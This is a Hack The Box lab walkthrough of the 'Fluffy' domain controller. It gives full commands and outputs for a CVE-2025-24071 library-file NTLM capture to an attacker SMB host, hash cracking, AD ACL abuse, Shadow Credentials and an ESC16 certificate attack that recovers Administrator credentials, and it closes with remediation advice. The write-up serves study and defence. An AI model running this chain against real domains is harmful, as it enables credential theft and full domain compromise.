---
title: 'HTB Fluffy: Complete Evidence-Led Walkthrough'
description: An SMB library-file credential capture followed by AD group control, shadow credentials and an ESC16 certificate mapping attack.
date: 2026-11-12
category: Windows / Active Directory
difficulty: Not recorded
tags:
- Hack The Box
- Active Directory
- SMB
- NetNTLMv2
- Shadow Credentials
- AD CS
- ESC16
published: true
slug: htb-fluffy
---

# Overview

**Machine:** Fluffy  
**Platform:** Hack The Box  
**Publication format:** htb-fluffy.md  

Fluffy starts from supplied low-privilege credentials. A writable IT share and a CVE advisory led to a credential-capture primitive; BloodHound and AD CS enumeration established a separate set of identity-escalation transitions.

**Documentation standard:** All meaningful stages, verification results, failed leads, command sequences, and operator notes from the uploaded source are retained below. A redacted placeholder means the method was documented but its secret value is intentionally excluded. Reported results and absent terminal evidence remain explicitly qualified.

### Engagement context from the original record

> **Engagement:** HTB Fluffy · Windows / Active Directory · CPTS preparation  
> **Target:** `10.129.87.121` (`DC01.fluffy.htb`)  
> **Domain:** `fluffy.htb` (`FLUFFY`)  
> **Result evidenced:** Administrator Kerberos TGT and NT hash recovered via ESC16.  
> **Evidence limitation:** The transcript does **not** include a successful final Administrator WinRM/SMB session or the root flag. Do not mark those as verified.

---

### Executive summary

Fluffy is a Windows Server 2019 domain-controller target in the `fluffy.htb` Active Directory domain. The lab starts with valid credentials for `j.fleischman`. Authenticated SMB enumeration revealed a writable `IT` share containing a PDF named `Upgrade_Notice.pdf` and software packages for Everything and KeePass. The PDF enumerated recent CVEs, including **CVE-2025-24071**. A crafted Windows Library archive placed on the writable share caused an outbound SMB authentication; Responder captured a NetNTLMv2 challenge-response from `p.agila`. The tester recovered that account's password by offline cracking.

BloodHound then showed a chain of AD control: `p.agila` belongs to **Service Account Managers**, which has `GenericAll` over **Service Accounts**. After adding `p.agila` to that group, we gained the ability to abuse `GenericWrite` over the `winrm_svc`, `ca_svc`, and `ldap_svc` objects. Shadow Credentials against `winrm_svc` produced its NT hash and a working WinRM shell on DC01. The same technique against `ca_svc` recovered another NT hash.

AD CS enumeration showed CA `fluffy-DC01-CA` with the SID security extension disabled, flagged by Certipy as **ESC16**. `ca_svc`, a member of **Cert Publishers**, could enroll in the client-authentication-capable `User` template. The tester found that `p.agila` could not change `ca_svc`'s UPN, but **`ca_svc` could change its own UPN**. After temporarily setting that UPN to `administrator`, requesting a certificate with that identity, and restoring the original UPN, PKINIT authentication succeeded as `administrator@fluffy.htb`. Certipy recovered the Administrator NT hash.

#### Verified attack path

```text
j.fleischman (provided domain credentials)
    |
    v
SMB IT share (READ/WRITE)
    |
    v
Upgrade_Notice.pdf -> CVE-2025-24071
    |
    v
Crafted .library-ms / ZIP -> outbound SMB authentication
    |
    v
Responder captures p.agila NetNTLMv2 -> offline password crack
    |
    v
p.agila -> member of Service Account Managers
    |
    v
GenericAll over Service Accounts -> add p.agila to group
    |
    +--> GenericWrite over winrm_svc
    |       -> Shadow Credentials -> NT hash -> WinRM shell on DC01
    |
    +--> GenericWrite over ca_svc
            -> Shadow Credentials -> ca_svc NT hash
            -> ca_svc changes its own UPN to administrator
            -> User template certificate (without SID extension)
            -> restore original ca_svc UPN
            -> PKINIT as Administrator -> TGT + Administrator NT hash
```

---

## Enumeration

This section documents the initial conditions, observable services, reachable applications and evidence that informed the next action.

### Scope and starting access

The machine provided these initial credentials:

```text
User:     j.fleischman
Password: [REDACTED]
Target:   10.129.87.121
```

Work in the authorized HTB lab only. Commands in this document reference that lab's IP and accounts.

A convenient local workspace:

```bash
export IP=10.129.87.121
mkdir -p <REDACTED>
cd ~/fluffy
```

The following hostname mapping was used:

```bash
echo '10.129.87.121 dc01.fluffy.htb fluffy.htb' | sudo tee -a /etc/hosts
getent hosts dc01.fluffy.htb
```

### Network and SMB reconnaissance

#### Full TCP scan

```bash
sudo nmap -Pn -p- --min-rate 2000 -T4 -oA scans/full_tcp "$IP"
```

The scan returned these TCP ports:

| Ports | Interpretation |
|---|---|
| 53 | DNS |
| 88, 464 | Kerberos and password change |
| 139, 445 | NetBIOS/SMB |
| 389, 636 | LDAP/LDAPS |
| 593 | RPC over HTTP endpoint mapper |
| 3268, 3269 | Global Catalog / TLS |
| 5985 | WinRM HTTP |
| 9389 | Active Directory Web Services |
| 49667, 49689, 49690, 49699, 49712, 49725 | High-numbered Windows RPC ports |

This service pattern strongly indicated an AD domain controller; SMB subsequently reported the hostname `DC01`.

#### Validate the supplied credentials

```bash
nxc smb 10.129.87.121 \
  -u 'j.fleischman' \
  -p '<REDACTED>' \
  --shares
```

Observed:

```text
Host:    DC01
Domain:  fluffy.htb
OS:      Windows Server 2019 family / build 17763
SMB:     Signing enabled; SMBv1 disabled
Auth:    [+] fluffy.htb\j.fleischman
```

The shares reported were:

| Share | Observed permissions as j.fleischman |
|---|---|
| `ADMIN$` | No access shown |
| `C$` | No access shown |
| `IPC$` | READ |
| **`IT`** | **READ, WRITE** |
| `NETLOGON` | READ |
| `SYSVOL` | READ |

**Decision:** Examine `IT` first. A writable administrative department share is an actionable foothold, but write access alone does not imply code execution.

#### Inspect the IT share

```bash
smbclient //10.129.87.121/IT -U 'fluffy.htb/j.fleischman'
```

Within `smbclient`:

```text
ls
recurse ON
ls
get Upgrade_Notice.pdf
```

The share contained:

```text
Everything-1.4.1.1026.x64/
Everything-1.4.1.1026.x64.zip
KeePass-2.58/
KeePass-2.58.zip
Upgrade_Notice.pdf
```

No KeePass `.kdbx` database was identified in this listing. Do not assume the executable package includes stored secrets.

Convert the PDF to text:

```bash
pdftotext -layout Upgrade_Notice.pdf -
```

It described mandatory patch scheduling and listed these CVEs:

```text
CVE-2025-24996
CVE-2025-24071
CVE-2025-46785
CVE-2025-29968
CVE-2025-21193
CVE-2025-3445
```

**Lead:** CVE-2025-24071, involving Windows Explorer processing a malicious Windows Library reference and potentially triggering outbound SMB authentication. This lined up with our ability to upload arbitrary files to the `IT` share.

---

## Analysis

The SMB-triggered authentication produced a NetNTLMv2 response that could be cracked offline. p.agila's group relationships provided GenericWrite on service accounts. Shadow Credentials delivered working service-account identities. ESC16 required an important permission distinction: p.agila could not set ca_svc's UPN, but ca_svc could change its own UPN, enroll a certificate, restore the UPN and obtain Administrator Kerberos material.

## Validation

The following is the full technical sequence retained from the uploaded write-up, including commands, outputs, dead ends, corrected tests and the limits of available proof. Section order within this part follows the original investigation.

### CVE-2025-24071 - Credential capture

#### Mechanism and prerequisites

The public PoC used in the session generates a ZIP containing a crafted `.library-ms` file. Its network location references an attacker-controlled SMB endpoint. Processing the crafted file on a susceptible Windows host may trigger an NTLM challenge-response to that endpoint.

Prerequisites relevant to this lab:

1. A location the initial user can write (`\\DC01\IT`).
2. The crafted file is encountered/processed by Windows under another user's context.
3. The target can connect back to the attacker's HTB VPN IP.
4. Responder is listening on the VPN interface.

**Caution:** The capture demonstrates an authentication event. It does not independently prove which desktop process processed the file, or that every installation matching a version string is vulnerable.

#### PoC setup

The PoC repository used was:

```text
https://github.com/ThemeHackers/CVE-2025-24071
```

After cloning it, the directory contained `exploit.py`, `README.md`, `requirements.txt`, and `LICENSE`.

```bash
python3 exploit.py -h
```

The tool exposed:

```text
-f, --file-name  Name of the library file (without extension)
-i, --ip-address Attacker SMB IP
-afv             Display affected Windows versions
```

`requirements.txt` specified `colorama`, a Python module, **not** a shell command. On Parrot, `python3-colorama` was installed already. If an isolated Python environment is preferred:

```bash
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
```

Find the attack-box VPN IP:

```bash
ip -4 -br addr show tun0
```

The observed address later in the engagement was `10.10.15.31`, although the VPN IP should always be rechecked for a new session.

Generate the crafted archive (example filename):

```bash
python3 exploit.py -f fluffy_test -i 10.10.15.31
ls -lh *.zip
unzip -l *.zip
```

The exact generated filename should be confirmed locally before upload.

#### Capture SMB authentication

In a second terminal:

```bash
sudo responder -I tun0 -v
```

Upload the resulting archive to the writable share:

```bash
smbclient //10.129.87.121/IT -U 'fluffy.htb/j.fleischman'
```

At the SMB prompt:

```text
put fluffy_test.zip
ls
```

The actual session produced a Responder SMB challenge-response for:

```text
FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash: p.agila::FLUFFY:<server-challenge>:<response>:<blob>
```

The original complete challenge-response was captured in the terminal. Preserve it exactly, on one line, when saving it for cracking. It is a **NetNTLMv2 challenge-response**, not the user's NT hash and not usable directly as an NT pass-the-hash value.

#### Recover the password offline

Save the full captured line to a local file, for example:

```bash
mkdir -p <REDACTED>
nano ~/fluffy/loot/p.agila.hash
```

Use Hashcat mode `5600`:

```bash
hashcat -m 5600 -a 0 \
  ~/fluffy/loot/p.agila.hash \
  /usr/share/wordlists/rockyou.txt

hashcat -m 5600 ~/fluffy/loot/p.agila.hash --show
```

Recovered password:

```text
FLUFFY\p.agila : [REDACTED]
```

Verify:

```bash
nxc smb 10.129.87.121 \
  -u 'p.agila' \
  -p '<REDACTED>' \
  --shares
```

The account authenticated successfully. It had READ/WRITE access to `IT` and READ access to `NETLOGON` and `SYSVOL`; there was no demonstrated administrative share access.

A WinRM authentication attempt for `p.agila` failed. Later, a `windows/smb/psexec` Metasploit attempt against the same DC failed with `STATUS_ACCESS_DENIED`: valid domain credentials did not imply service-creation/administrative rights.

**Lesson:** When credential validation works but remote command execution fails, stop assuming a shell is warranted. Enumerate authorization boundaries.

---

### Active Directory ACL attack chain

#### BloodHound collection

```bash
bloodhound-python \
  -u 'p.agila' \
  -p '<REDACTED>' \
  -d fluffy.htb \
  -ns 10.129.87.121 \
  -dc dc01.fluffy.htb \
  -c All --zip
```

Import the output ZIP into BloodHound (the version-appropriate collector is preferable for BloodHound CE). Search for:

```text
P.AGILA@FLUFFY.HTB
```

The user's **Outbound Object Control** graph revealed:

```text
P.AGILA --MemberOf--> SERVICE ACCOUNT MANAGERS
SERVICE ACCOUNT MANAGERS --GenericAll--> SERVICE ACCOUNTS
```

The target group initially contained:

```text
FLUFFY\ca_svc
FLUFFY\ldap_svc
FLUFFY\winrm_svc
```

#### Abuse GenericAll on a group

List membership:

```bash
net rpc group members 'Service Accounts' \
  -U 'FLUFFY/p.agila%[REDACTED]' \
  -S 10.129.87.121
```

Add the controlled account:

```bash
net rpc group addmem 'Service Accounts' 'p.agila' \
  -U 'FLUFFY/p.agila%[REDACTED]' \
  -S 10.129.87.121
```

Verify:

```bash
net rpc group members 'Service Accounts' \
  -U 'FLUFFY/p.agila%[REDACTED]' \
  -S 10.129.87.121
```

Observed after modification:

```text
FLUFFY\ca_svc
FLUFFY\ldap_svc
FLUFFY\p.agila
FLUFFY\winrm_svc
```

BloodHound showed that **Service Accounts** had `GenericWrite` paths to `winrm_svc`, `ca_svc`, and `ldap_svc`.

**Nuance:** One later LDAP query of `p.agila` returned only `Service Account Managers`, seemingly omitting the just-added `Service Accounts` membership. The record does not establish why: stale state, reset, replication, or a later re-add may be involved. An initial Shadow Credentials attempt failed with insufficient rights, and a subsequent attempt succeeded. Record the inconsistency instead of claiming a single proven cause.

#### Inspect the WinRM service account

```bash
ldapsearch -LLL -x \
  -H ldap://10.129.87.121 \
  -D 'p.agila@fluffy.htb' \
  -w '[REDACTED]' \
  -b 'DC=fluffy,DC=htb' \
  '(sAMAccountName=winrm_svc)' \
  dn servicePrincipalName msDS-KeyCredentialLink
```

Observed:

```text
dn: CN=winrm service,CN=Users,DC=fluffy,DC=htb
servicePrincipalName: WINRM/winrm.fluffy.htb
```

No `msDS-KeyCredentialLink` value was returned. This does **not** itself prove write permission to that attribute.

---

### Shadow Credentials against winrm_svc

#### Theory

A Shadow Credentials attack adds an asymmetric key credential to an AD user object's `msDS-KeyCredentialLink`. If the KDC supports the necessary PKINIT authentication, the operator can authenticate as that user with the associated certificate and potentially retrieve credential material using a Kerberos-based technique. Certipy's `shadow auto` automates creation, authentication, and attempted restoration.

In practice, **effective LDAP attribute write rights matter**. BloodHound graph edges are hypotheses to validate, not substitutes for actual access checks.

#### Certipy connectivity troubleshooting

The initial command:

```bash
certipy-ad shadow auto \
  -u 'p.agila@fluffy.htb' \
  -p '<REDACTED>' \
  -account 'winrm_svc' \
  -dc-ip 10.129.87.121
```

failed with:

```text
LDAPSocketOpenError: [Errno 113] No route to host
```

The route and connectivity were actually present:

```bash
ip -4 -br addr
ip route get 10.129.87.121
ping -c 3 10.129.87.121
nc -zv -w 3 10.129.87.121 389
nc -zv -w 3 10.129.87.121 88
nc -zv -w 3 10.129.87.121 445
getent hosts dc01.fluffy.htb
```

All three tested TCP ports connected, and the target responded to ICMP. Specifying the DC host **and** target IP allowed Certipy to bind successfully using LDAPS:

```bash
certipy-ad shadow auto \
  -u 'p.agila@fluffy.htb' \
  -p '<REDACTED>' \
  -account 'winrm_svc' \
  -dc-ip 10.129.87.121 \
  -dc-host dc01.fluffy.htb \
  -target-ip 10.129.87.121 \
  -debug
```

The first LDAPS attempt reached the server but returned `INSUFF_ACCESS_RIGHTS` while writing the key credential. A later attempt using the same explicit host/IP parameters succeeded. Avoid simplifying these two failures into a single connection issue.

#### Successful account takeover

The successful Certipy output reported:

```text
Successfully added Key Credential ... to 'winrm_svc'
Got TGT
Saved credential cache to 'winrm_svc.ccache'
Successfully restored the old Key Credentials for 'winrm_svc'
NT hash for 'winrm_svc': [REDACTED_HEX]
```

Validate WinRM:

```bash
nxc winrm 10.129.87.121 \
  -d fluffy.htb \
  -u winrm_svc \
  -H '[REDACTED_HEX]'
```

Connect:

```bash
evil-winrm \
  -i 10.129.87.121 \
  -u winrm_svc \
  -H '[REDACTED_HEX]'
```

A working Evil-WinRM session was demonstrated on **DC01**. Enumeration:

```powershell
whoami
whoami /priv
whoami /groups
hostname
```

Confirmed:

```text
Identity:  fluffy\winrm_svc
Hostname:  DC01
Groups:    Remote Management Users, Service Accounts,
           Certificate Service DCOM Access, Users, etc.
Integrity: Medium Plus
Privileges: SeMachineAccountPrivilege, SeChangeNotifyPrivilege,
            SeIncreaseWorkingSetPrivilege
```

No administrator token was shown. No `SeImpersonatePrivilege` was listed. At this stage we had **interactive DC access as a low-privilege service account**, not Domain Admin.

---

### AD CS discovery

#### Enumerate using the winrm_svc hash

```bash
certipy-ad find \
  -u 'winrm_svc@fluffy.htb' \
  -hashes ':[REDACTED_HEX]' \
  -dc-ip 10.129.87.121 \
  -target dc01.fluffy.htb \
  -enabled -stdout
```

Certipy found:

```text
33 certificate templates total
11 enabled certificate templates
1 enterprise CA: fluffy-DC01-CA
CA host: DC01.fluffy.htb
Request disposition: Issue
User-specified SAN: Disabled
Disabled extensions: 1.3.6.1.4.1.311.25.2
```

The disabled extension is **szOID_NTDS_CA_SECURITY_EXT** (the AD SID security extension). This configuration is the foundation of the **ESC16** abuse condition. It is not by itself proof that arbitrary administrator certificates are available; rights and certificate mapping still matter.

The `User` template was noteworthy:

```text
Template: User
Enabled: True
Client Authentication: True
Enrollee Supplies Subject: False
Manager Approval: False
Authorized Signatures Required: 0
Enrollment Rights: Domain Users (plus privileged groups)
```

The CA also granted `Enroll` to **Cert Publishers** and Administrators. Certificate enrollment rights must be considered at both the CA and template levels.

#### Examine ca_svc

```bash
ldapsearch -LLL -x \
  -H ldap://10.129.87.121 \
  -D 'p.agila@fluffy.htb' \
  -w '[REDACTED]' \
  -b 'DC=fluffy,DC=htb' \
  '(sAMAccountName=ca_svc)' \
  dn memberOf servicePrincipalName userPrincipalName msDS-KeyCredentialLink
```

Observed:

```text
dn: CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
memberOf: CN=Service Accounts,CN=Users,DC=fluffy,DC=htb
memberOf: CN=Cert Publishers,CN=Users,DC=fluffy,DC=htb
userPrincipalName: ca_svc@fluffy.htb
servicePrincipalName: ADCS/ca.fluffy.htb
```

`Cert Publishers` membership explained why CA enrollment permissions warranted investigation.

---

### Shadow Credentials against ca_svc

Use the delegated `GenericWrite` path from `p.agila` through **Service Accounts**:

```bash
certipy-ad shadow auto \
  -u 'p.agila@fluffy.htb' \
  -p '<REDACTED>' \
  -account 'ca_svc' \
  -dc-ip 10.129.87.121 \
  -dc-host dc01.fluffy.htb \
  -target-ip 10.129.87.121
```

Observed:

```text
Successfully added Key Credential ... to 'ca_svc'
Got TGT
Saved credential cache to 'ca_svc.ccache'
Successfully restored the old Key Credentials for 'ca_svc'
NT hash for 'ca_svc': [REDACTED_HEX]
```

Verify hash-based authentication:

```bash
nxc smb 10.129.87.121 \
  -d fluffy.htb \
  -u ca_svc \
  -H '[REDACTED_HEX]'
```

This succeeded. A follow-up Certipy enumeration as `ca_svc` explicitly reported:

```text
[!] Vulnerabilities
  ESC16 : Security Extension is disabled.
[*] Remarks
  Other prerequisites may be required for this to be exploitable.
```

At this point we controlled a service identity able to enroll certificates through the CA, and we had evidence of ESC16.

---

### ESC16 - UPN change and certificate identity mapping

#### Why this path works

The certificate authority was not including the AD SID security extension in issued certificates. The operator controlled `ca_svc` and could obtain its authentication certificate. If the `ca_svc` UPN were temporarily set to `administrator`, a new certificate based on its directory UPN could contain that privileged identity without the SID security extension. After the UPN was restored, the KDC could map the certificate's UPN to the actual Administrator account under the lab's mapping conditions.

**Distinguish privileges carefully:** Although `p.agila` could add Shadow Credentials to `ca_svc`, its direct attempt to change `ca_svc`'s UPN was denied. The successful UPN update was performed by **authenticating as `ca_svc` itself** using the recovered NT hash.

#### Preserve original state

LDAP query:

```bash
ldapsearch -LLL -x \
  -H ldap://10.129.87.121 \
  -D 'p.agila@fluffy.htb' \
  -w '[REDACTED]' \
  -b 'DC=fluffy,DC=htb' \
  '(|(sAMAccountName=ca_svc)(sAMAccountName=Administrator))' \
  dn sAMAccountName userPrincipalName objectSid
```

Before modification:

```text
ca_svc      userPrincipalName: ca_svc@fluffy.htb
Administrator  userPrincipalName: [not populated]
```

An Administrator account may lack an explicitly populated UPN; that alone is not abnormal.

#### Failed attempt: modify UPN as p.agila

```bash
certipy-ad account update \
  -u 'p.agila@fluffy.htb' \
  -p '<REDACTED>' \
  -user ca_svc \
  -upn administrator \
  -dc-ip 10.129.87.121 \
  -dc-host dc01.fluffy.htb \
  -target-ip 10.129.87.121
```

Result:

```text
User 'P.AGILA' doesn't have permission to update these attributes on 'ca_svc'
```

That output is evidence that the requested UPN update was not authorized with those credentials. Do not interpret `GenericWrite` as an unconditional ability to modify every attribute.

#### Failed certificate request / wrong identity

A certificate request using the unchanged `ca_svc` account initially timed out over RPC. A subsequent request succeeded, but issued a certificate with the original identity:

```text
Request ID: 21
SAN UPN: ca_svc@fluffy.htb
SID extension: absent
File: ca_svc.pfx
```

Trying to authenticate to Certipy as `administrator` with `ca_svc.pfx` produced a **name mismatch**. The missing SID extension does not magically transform a certificate whose SAN identifies `ca_svc` into an Administrator credential.

#### Successful update: change own UPN as ca_svc

```bash
certipy-ad account update \
  -u 'ca_svc@fluffy.htb' \
  -hashes ':[REDACTED_HEX]' \
  -user 'ca_svc' \
  -upn 'administrator' \
  -dc-ip 10.129.87.121 \
  -dc-host dc01.fluffy.htb \
  -target-ip 10.129.87.121
```

Observed:

```text
Updating user 'ca_svc': userPrincipalName : administrator
Successfully updated 'ca_svc'
```

The suffix-free value **`administrator`** was the value used successfully in this particular lab sequence.

#### Enroll the privileged-identity certificate

```bash
certipy-ad req \
  -u 'ca_svc@fluffy.htb' \
  -hashes ':[REDACTED_HEX]' \
  -dc-ip 10.129.87.121 \
  -target dc01.fluffy.htb \
  -ca 'fluffy-DC01-CA' \
  -template 'User'
```

Observed:

```text
Request ID is 23
Successfully requested certificate
Got certificate with UPN 'administrator'
Certificate has no object SID
Saving certificate and private key to 'administrator.pfx'
```

This was the correct certificate for the intended mapping path. The file `administrator.pfx` contains sensitive private-key material and should be stored securely.

#### Failed authentication while ca_svc still had UPN administrator

An initial attempt:

```bash
certipy-ad auth \
  -pfx administrator.pfx \
  -username administrator \
  -domain fluffy.htb \
  -dc-ip 10.129.87.121
```

failed with a name mismatch. A contemporaneous LDAP read showed:

```text
ca_svc userPrincipalName: administrator
```

The attribute had **not yet been restored**. That is the critical ordering error to remember.

#### Restore original ca_svc UPN

The original UPN is:

```text
ca_svc@fluffy.htb
```

The restoration command is:

```bash
certipy-ad account update \
  -u 'ca_svc@fluffy.htb' \
  -hashes ':[REDACTED_HEX]' \
  -user 'ca_svc' \
  -upn 'ca_svc@fluffy.htb' \
  -dc-ip 10.129.87.121 \
  -dc-host dc01.fluffy.htb \
  -target-ip 10.129.87.121
```

Verify via LDAP:

```bash
ldapsearch -LLL -x \
  -H ldap://10.129.87.121 \
  -D 'p.agila@fluffy.htb' \
  -w '[REDACTED]' \
  -b 'DC=fluffy,DC=htb' \
  '(sAMAccountName=ca_svc)' userPrincipalName
```

Expected restored value:

```text
userPrincipalName: ca_svc@fluffy.htb
```

**Evidence note:** The transcript includes the instruction to restore the UPN and then a successful subsequent Administrator authentication; it does not show the successful restoration command output itself. The change was apparently made between those messages, but the exact terminal confirmation was not preserved. In a fresh execution, always save that evidence.

#### Successful Administrator authentication

Retry with the **already issued** `administrator.pfx` (no need to re-enroll):

```bash
certipy-ad auth \
  -pfx administrator.pfx \
  -username administrator \
  -domain fluffy.htb \
  -dc-ip 10.129.87.121
```

Observed success:

```text
Certificate identities:
  SAN UPN: 'administrator'
Using principal: 'administrator@fluffy.htb'
Trying to get TGT...
Got TGT
Saving credential cache to 'administrator.ccache'
Wrote credential cache to 'administrator.ccache'
Trying to retrieve NT hash for 'administrator'
Got hash for 'administrator@fluffy.htb':
  [REDACTED_HEX]:[REDACTED_HEX]
```

The first 32-character component represents the conventional empty LM hash. The second is the recovered **Administrator NT hash**:

```text
[REDACTED_HEX]
```

**Verified result:** Valid Administrator certificate-based Kerberos authentication, TGT obtained, NT hash recovered. This establishes a high-impact domain compromise. A final administrative shell or root-flag read was not supplied in the transcript.

---

### Optional final administrative validation (not observed)

These are suggested verification steps, not claims that they were executed successfully.

```bash
nxc smb 10.129.87.121 \
  -d fluffy.htb \
  -u Administrator \
  -H '[REDACTED_HEX]'
```

A `(Pwn3d!)` marker would indicate administrative access through NetExec's SMB checks.

```bash
evil-winrm \
  -i 10.129.87.121 \
  -u Administrator \
  -H '[REDACTED_HEX]'
```

Inside a successful Administrator session:

```powershell
whoami
whoami /groups
hostname
Get-Content C:\Users\Administrator\Desktop\root.txt
```

**Flag status:** Not present in supplied evidence. Do not fabricate the value.

---

### Troubleshooting reference

| Symptom | Cause suggested by evidence | How we addressed it |
|---|---|---|
| `colorama: command not found` | Python package mistaken for executable | Verify `python3 -c 'import colorama'`; package `python3-colorama` or virtualenv |
| PsExec `STATUS_ACCESS_DENIED` | Authenticated user lacks necessary remote-admin rights | Switch to AD privilege and ACL enumeration |
| Certipy `No route to host` despite working `nc` | Certipy target/host resolution or connection choice | Explicit `-dc-host dc01.fluffy.htb` plus `-target-ip 10.129.87.121` |
| `INSUFF_ACCESS_RIGHTS` on Shadow Credentials | Effective LDAP write was denied at that moment | Check group membership, access rights, and fresh authentication; later test succeeded |
| `KRB_AP_ERR_SKEW` from GetUserSPNs | Kerberos time difference too large | Sync attack VM clock to DC in the lab (e.g., `sudo ntpdate -u 10.129.87.121`) |
| `p.agila` cannot update `ca_svc` UPN | Specific attribute update denied | Use compromised `ca_svc` to change **its own** UPN |
| RPC certificate request times out | Transient RPC/network problem (exact cause not proven) | Retry once after checking transport; second request succeeded |
| Certificate SAN `ca_svc@fluffy.htb` | UPN not modified when certificate issued | Re-enroll only after correct UPN change |
| `administrator.pfx` name mismatch on first auth | `ca_svc` UPN still set to `administrator` | Restore service UPN, then retry existing PFX |

#### Kerberos time synchronization detail

A separate attempt to Kerberoast the already-SPN-enabled `winrm_svc` used:

```bash
impacket-GetUserSPNs fluffy.htb/p.agila:'[REDACTED]' \
  -dc-ip 10.129.87.121 \
  -request-user winrm_svc \
  -outputfile ~/fluffy/loot/winrm_tgs.hash
```

It returned `KRB_AP_ERR_SKEW(Clock skew too great)`. The engagement later progressed through Shadow Credentials rather than a documented successful Kerberoast. Do not count Kerberoasting as an exploited link in this box.

---

### Quick-reference command index

```bash
# Scan
sudo nmap -Pn -p- --min-rate 2000 -T4 -oA scans/full_tcp 10.129.87.121

# Initial share enumeration
nxc smb 10.129.87.121 -u j.fleischman -p '<REDACTED>' --shares

# PDF extraction
pdftotext -layout Upgrade_Notice.pdf -

# Capture
sudo responder -I tun0 -v

# NetNTLMv2 cracking
hashcat -m 5600 -a 0 loot/p.agila.hash /usr/share/wordlists/rockyou.txt

# BloodHound
bloodhound-python -u p.agila -p '<REDACTED>' -d fluffy.htb \
  -ns 10.129.87.121 -dc dc01.fluffy.htb -c All --zip

# AD group membership abuse
net rpc group addmem 'Service Accounts' p.agila \
  -U 'FLUFFY/p.agila%[REDACTED]' -S 10.129.87.121

# Shadow Credentials
certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p '<REDACTED>' \
  -account winrm_svc -dc-ip 10.129.87.121 \
  -dc-host dc01.fluffy.htb -target-ip 10.129.87.121

# WinRM foothold
evil-winrm -i 10.129.87.121 -u winrm_svc \
  -H [REDACTED_HEX]

# AD CS enumeration
certipy-ad find -u 'winrm_svc@fluffy.htb' \
  -hashes ':[REDACTED_HEX]' \
  -dc-ip 10.129.87.121 -target dc01.fluffy.htb -enabled -stdout

# ca_svc takeover
certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p '<REDACTED>' \
  -account ca_svc -dc-ip 10.129.87.121 \
  -dc-host dc01.fluffy.htb -target-ip 10.129.87.121

# UPN update AS ca_svc
certipy-ad account update -u 'ca_svc@fluffy.htb' \
  -hashes ':[REDACTED_HEX]' \
  -user ca_svc -upn administrator -dc-ip 10.129.87.121 \
  -dc-host dc01.fluffy.htb -target-ip 10.129.87.121

# Certificate request
certipy-ad req -u 'ca_svc@fluffy.htb' \
  -hashes ':[REDACTED_HEX]' \
  -dc-ip 10.129.87.121 -target dc01.fluffy.htb \
  -ca fluffy-DC01-CA -template User

# CRITICAL: Restore UPN before certificate authentication
certipy-ad account update -u 'ca_svc@fluffy.htb' \
  -hashes ':[REDACTED_HEX]' \
  -user ca_svc -upn 'ca_svc@fluffy.htb' -dc-ip 10.129.87.121 \
  -dc-host dc01.fluffy.htb -target-ip 10.129.87.121

# Administrator PKINIT
certipy-ad auth -pfx administrator.pfx -username administrator \
  -domain fluffy.htb -dc-ip 10.129.87.121
```

---

## Impact

The source directly supports recovery of an Administrator TGT and NT hash, not a verified final Administrator shell or root-flag retrieval.

### Evidence registry

| ID | Evidence | Status |
|---|---|---|
| E01 | Nmap full TCP output and DC ports | Confirmed |
| E02 | NetExec authenticates `j.fleischman`; `IT` READ/WRITE | Confirmed |
| E03 | `Upgrade_Notice.pdf` lists CVE-2025-24071 | Confirmed |
| E04 | Responder NetNTLMv2 capture for `p.agila` | Confirmed |
| E05 | Password recovery `[REDACTED]` and SMB login | Confirmed |
| E06 | BloodHound GenericAll chain via Service Account Managers | Confirmed from user-shared graph |
| E07 | `net rpc group addmem` and membership verification | Confirmed |
| E08 | BloodHound GenericWrite paths to three service accounts | Confirmed from user-shared graph |
| E09 | Successful Shadow Credentials on `winrm_svc`, restored | Confirmed |
| E10 | Evil-WinRM shell `fluffy\winrm_svc` on DC01 | Confirmed |
| E11 | Certipy CA/template enumeration, ESC16 | Confirmed |
| E12 | Successful Shadow Credentials on `ca_svc`, restored | Confirmed |
| E13 | ca_svc self-UPN update to `administrator` | Confirmed |
| E14 | Request ID 23, `administrator.pfx` without SID | Confirmed |
| E15 | Restoration of original UPN | Inferred from subsequent successful auth; direct success output absent |
| E16 | Administrator TGT + NT hash recovered | Confirmed |
| E17 | Administrator interactive shell / root.txt | **Not evidenced** |

Store copies of timestamps, screenshots, command output, BloodHound export, and relevant logs during subsequent reproductions. Protect hashes, credentials, CCACHE files, PFX private keys, and the Responder capture as sensitive material.

---

### End state

**Fluffy's Administrator identity was successfully compromised through a chained SMB credential leak, AD ACL abuse, Shadow Credentials, and ESC16 certificate authentication.** The final preserved terminal output shows issuance of `administrator.ccache` and extraction of the Administrator NT hash. A final remote Administrator shell and `root.txt` were not shown, and remain unverified in this record.

*Document prepared from the supplied hands-on session. Commands and evidence are retained for study; recovered secrets and flags are redacted in this public edition.*

## Remediation

The defensive recommendations and operational lessons below address the demonstrated weaknesses. They follow the original source material instead of inferring additional compromise.

### Remediation insights

1. **Restrict shared-folder write access and review file handling.** The writable `IT` location enabled delivery of a file that induced outbound authentication. Apply relevant CVE-2025-24071 patches, control who can write to shared locations, and restrict outbound SMB where practicable.
2. **Harden NTLM authentication and outbound paths.** Reduce unnecessary NTLM usage, monitor outbound SMB, and follow organizational policy on NTLM restrictions and SMB authentication.
3. **Review AD group and object ACLs.** `GenericAll` over a group, followed by `GenericWrite` to service accounts, made privilege escalation possible. Limit delegated object control to specific operational requirements.
4. **Protect PKINIT / Shadow Credential surfaces.** Alert on changes to `msDS-KeyCredentialLink`, especially on privileged or service identities; investigate unexpected new key credentials and verify rollback.
5. **Protect certificate authority configuration.** Re-enable and correctly manage the SID security extension where applicable, keep AD CS updated, and enforce secure KDC certificate mapping. Review issued-certificate identities and template/CA enrollment policies.
6. **Avoid overly permissive self-service identity changes.** Audit who can change `userPrincipalName` on accounts eligible for authentication certificates. Monitor abrupt changes and restoration sequences.
7. **Monitor AD CS enrollment and account changes together.** The UPN-change → certificate-request → UPN-restore sequence is especially meaningful when correlated with unusual PKINIT activity.

---

### CPTS lessons and methodology takeaways

- **Documents can be more valuable than binaries.** The upgrade notice converted a broad writable-share lead into a specific vulnerability test.
- **Enumerate first; only then exploit.** Validate reachability, privileges, account memberships, and controls rather than brute-forcing shell access.
- **Differentiate authentication from authorization.** A valid SMB login did not imply PsExec privileges. A valid WinRM shell did not imply administrator privileges.
